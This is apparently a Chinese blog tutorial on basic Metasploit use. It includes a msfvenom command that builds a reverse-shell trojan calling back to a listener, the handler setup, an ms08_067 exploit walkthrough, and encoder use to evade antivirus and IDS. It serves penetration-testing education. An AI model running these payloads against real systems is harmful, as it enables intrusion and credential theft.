渗透工具-MSF基础使用

作者: ZG0T01 日期: 2020-12-06 阅读时间:6.0 分钟 字数:1344 阅读量: -

前言

Metesploit是协助安全工程师进行渗透的框架，简称为MSF（Metesploit-Framework）。

Github开源地址：https://github.com/rapid7/metasploit-framework

Linux下安装教程可参考Micro8师傅：msf的前生今世

用户接口

Metasploit为它的基础功能提供了多个接口，包含终端、命令行和图形化界面等。除了接口外，功能程序（utilities）还提供了对Metasploit框架中内部功能的直接访问，这使功能程序对于渗透代码的开发，以及一些不需要整体框架的灵活性场景非常方便。

MSF终端

MSF终端（msfconsole）是目前Metasploit框架中最流行的用户接口。它是最灵活、功能最丰富以及支持最好的接口，它提供了一站式接口，能够访问Metasploit框架中几乎每一个选项和配置。

启用MSF终端（以kali为基础）：

kali@kali:~$ msfconsole

通过help+command即可访问MSF终端中的帮助文件，它对该命令进行详细的描述：

msf5 > help connect

功能程序（utilities）

Metasploit的功能程序是在某些特定的场合下，对框架中的一些特殊功能进行直接访问的接口，在渗透代码的开放中特别有用。

攻击载荷生成器（msfpayload）

msfpayload可以生成shellcode、可执行代码和其他更多的读写，也可以用于渗透代码中。

shellcode可以生成包括C、JavaScript、甚至Web脚本在内的多种格式，每种输出各种在不同的场景使用。

编码器（msfencoed）

在网络上明文传输shellcode时很容易被入侵检测系统和杀软所识别出来，为了解决这一问题，Metasploit提供了MSF编码器。

它可以帮助你通过对原始payload进行编码的方式，来避免坏字符，以及bypass杀软和IDS的检测。

msfvenom

Msfvenom是有效负载生成和编码的结合。 它在2015年6月8日取代了msfpayload和msfencode。

具体使用可参考：https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message

以生成反弹shell为例进行演示：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.128 LPORT=4444 -f exe > shell.exe

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.213.128
set LPORT 4444
exploit

模块 module

Metasploit框架中包含了数百个模块，可以通过show命令来显示模块。

msf5 > show

还可以通过search命令来查找指定模块（以ms08-067为例）：

msf5 > search ms08-067


通过use命令来选择模块：

msf5 > use exploit/windows/smb/ms08_067_netapi

当我们选择了一个模块后，可以通过show options来查看模块需要正确运行所需的设置：

msf5 exploit(windows/smb/ms08_067_netapi) > show options

options由三部分组成：

  • Payload options

    该模块下需要先选择payload，show payloads 命令来查看可选payload：

    msf5 exploit(windows/smb/ms08_067_netapi) > show payloads

然后通过set命令来选择payload：

msf5 exploit(windows/smb/ms08_067_netapi) > set payload windows/shell/reverse_tcp

  • Module options

    在选择了payload后，就可以进行module options的具体设置。

    set RHOSTS 192.168.52.1

  • Exploit target

    show target命令可以列出受漏洞影响的目标系统类型：

    msf5 exploit(windows/smb/ms08_067_netapi) > show targets

默认情况下，target选择为编号0：

可以通过set 命令来修改：

msf5 exploit(windows/smb/ms08_067_netapi) > set target 1

最后通过run/exploit命令来执行。

会话 Meterpreter

Meterpreter是MSF的一个扩展模块，可以调用MSF的一些功能，对目标系统进行更深的渗透，包括：读取密码hash、提权、跳板攻击等等。

首先通过msfvenom生成木马：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.128 LPORT=4444 -f exe > shell.exe

然后在本机进行监听：

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.213.128

set LPORT 4444

exploit

当木马在目标机器被执行后，会返回一个Meterpreter会话：

通过该会话，就能获取一个目标系统上的Meterpreter Shell。

参数

通过help参数可以查看Meterpreter的功能。

meterpreter > help

  • File system Commands

  • Networking Commands
  • System Commands
  • User interface Commands
  • Webcam Commands
  • Others

background

通过background命令可以把当前meterpreter会话挂起在后台：

background

session

  • 查看会话

    如果对多个目标进行了攻击，会同时开启多个会话，通过session -l命令可以查看Meterpreter的情况：

    sessions -l

如果想查看会话的详细信息，可以通过命令：

sessions -l -v

  • 会话交互：

    通过以下命令，可以与不同id的session进行交互：

    sessions -i 1
